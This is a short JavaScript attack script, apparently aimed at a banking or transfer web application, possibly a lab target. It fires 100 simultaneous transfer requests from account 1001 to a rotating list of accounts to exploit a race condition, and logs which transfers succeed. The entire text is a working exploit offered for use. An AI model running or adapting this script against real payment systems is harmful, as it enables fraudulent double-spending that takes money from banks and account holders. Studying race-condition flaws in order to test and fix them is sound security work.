(function enviarRaceCondition() {
    let transferInfo = { accountSource: 1001, accountDestination: 2001, amount: 10000, description: '' };
    const accounts = [1002, 1003, 2001, 2002, 2003, 3001, 3002, 3003];
    let procesos = [];

    for (let cantidad = 0, cuenta = 0; cantidad < 100; cantidad++, cuenta++) {
        if (accounts[cuenta] == undefined) {
            cuenta = 0;
        }

        transferInfo.accountDestination = accounts[cuenta];

        procesos.push(enviar(transferInfo, function (data) {
            let time = Date.now();
            if (data.length == 0) {
                console.log(`%c ${time} - Transferencia exitosa. Cuenta: ${transferInfo.accountDestination}`, 'background: #222; color: #18db4c; font-size: 30px;');
            } else {
                console.log(`%c ${time} - ${data[0]}. Cuenta: ${transferInfo.accountDestination}`, 'background: #222; color: #db1818; font-size: 30px;');
            }
        }));
    }

    Promise.all(procesos);
})();